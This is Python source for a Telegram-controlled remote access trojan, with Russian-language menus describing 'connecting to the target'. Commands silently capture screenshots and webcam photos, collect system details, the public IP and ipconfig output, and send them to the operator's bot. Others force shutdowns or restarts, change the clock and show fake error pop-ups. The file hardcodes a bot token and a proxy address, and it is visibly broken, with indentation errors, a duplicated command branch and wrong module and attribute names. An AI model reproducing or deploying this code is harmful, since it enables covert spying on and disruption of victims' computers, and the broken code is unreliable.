import telebot
import urllib
import platform
import os
import time
import datetime
import pyttsx3
import autopy
import cv2
from telebot import apihelper

bot = telebot.TeleBot('1187555043:AAGxpyNUhS8219-vNlRUE5Ltcdk2Nbd7FYA')

apihelper.proxy = {'https': 'https://165.22.44.23:3128'}

@bot.message_handler(content_types=['text'])
def get_text_messages(message):
	if message.text == "/start":
		ippublic = urllib.urlopen("https://ip.42.pl/raw").read()
		hello1 = 'Привет!\n'
		hello2 = 'Добро пожаловать в удаленное управление системой\n'
		hello3 = 'Время: '+time.ctime()+'\n'
		hello4 = 'Айпи: '+ippublic+'\n'
		chat_id = message.chat.id
		bot.send_message(chat_id, hello1, hello2, hello3, hello4)
	elif message.text == "/help":
		helptxt = '''
Вот все команды:

[01] запуск и подключение к цели.
[ /] /start

[02] Помощь.
[ /] /help

[03] Информация о системе.
[ /] /sysinfo

[04] Сделать скриншот.
[ /] /screenshot

------------------------
Остальные команды:

[01] Айпи адрес:
[ /] /ip

[02] Получить файл с айпи.
[ /] /ipconfig

[04] Выключить.
[ /] /shutdown

[05] Перезагрузить.
[ /] /restart

[06] Отправить сообщение.
[ /] /message

[07] Отправить голосовое сообщение.
[ /] /voicemsg

[11] Сменить время на 00:00.
[ /] /time

[12] Сделать фото вебкамеры.
[ /] /webscreen

'''
	chat_id = message.chat.id
	bot.send_message(chat_id , helptxt)
	elif message.text == "/time":
			os.system("time 00:00")
		chat_id = message.chat.id
		bot.send_message(chat_id , "Время изменено на 00:00")
	elif message.text == "/webscreen":
		chat_id = message.chat.id
		bot.send_message(chat_id , "Подождите ...")
		cap = cv2.VideoCapture(0)
		ret, frame = cap.read()
		cv2.imwrite('\\cache\\WebShot.png', frame)
		chat_id = message.chat.id
		webcam_photo = open("\\cache\\WebShot.png" , "rb")
		bot.send_photo(chat_id,webcam_photo,"Фото сделано")
		webcam_photo.close()
		os.system("del \cache\WebShot.png")
	elif message.text == "/restart":
		chat_id = message.chat.id
		bot.send_message(chat_id , "Перезагрузка сделана")
		os.system("shutdown /r /t 1")
	elif message.text == "/message":
		os.system("msg * Error")
		chat_id = message.chat.id
		bot.send_message(chat_id , "Сообщение отправлено")
	elif message.text == "/shutdown":
		chat_id = message.chat.id
		bot.send_message(chat_id, "Начинается выключение")
		os.system("shutdown /s /t 1")
	elif message.text == "/voicemsg":
		chat_id = message.chat.id
		bot.send_message(chat_id , "Воспроизведение голосовых сообщений")
		sound = pyttsx.init()
		sound.setProperty("rate", 110)
		sound.say("Привет")
		sound.runAndWait()
		chat_id = message.chat.id
		bot.send_message(chat_id , "Успешно")
	elif message.text == "/ipconfig":
		chat_id = message.chat.id
		bot.send_message(chat_id , "Подождите ...")
		os.system("ipconfig >> C:\\Windows\\getip.txt")
		getipfile = open("C:\\Windows\\getip.txt" , "rb")
		bot.send_document(chat_id,getipfile,"GetIP.txt")
		getipfile.close()
	elif message.text == "/ipconfig":
		ip = urllib.urlopen("https://ip.42.pl/raw").read()
		iptxt = ''
		iptxt = 'Айпи: '+ip+'\n\n'
		bot.send_message(chat_id, iptxt)
	elif message.text == "/sysinfo":
		chat_id = message.chat.id
		ip_public = urllib.urlopen("http://ip.42.pl/raw").read()
		data1 = 'OS: ' + platform.uname()[0] + ' ' + platform.uname()[2] + ' - ' + platform.architecture()[0] + '\n'
		data2 = 'Node: ' + platform.node() + '\n'
		data3 = 'PC Name: ' + platform.uname()[1] + '\n'
		data4 = 'Version: ' + platform.uname()[3] + '\n'
		data5 = 'System Type: ' + platform.uname()[4] + '\n'
		data6 = 'Description: ' + platform.uname()[5] + '\n'
		data7 = 'Public IP: ' + ip_public + '\n'
		data8 = '\n'
		data9 = 'Успешно'
		bot.send_message(chat_id, data1, data2, data3, data4, data5, data6, data7, data8, data9)
	elif message.text == "/screenshot":
		chat_id = message.chat.id
		bot.send_message(chat_id , "Подождите ...")
		image = autopy.bitmap.capture_screen()
		image.save("\\cache\\ScreenShot.png")
		chat_id = message.chat_id
		photo = open("\\cache\\ScreenShot.png" , "rb")
		bot.send_photo(chat_id,photo,"Фото сделано")
		photo.close()
		os.system("del \cache\ScreenShot.png")	
	else:
		bot.send_message(message.from_user.id, "Неправильная командна. Напиши /help.")
bot.polling(none_stop=True, interval=0)
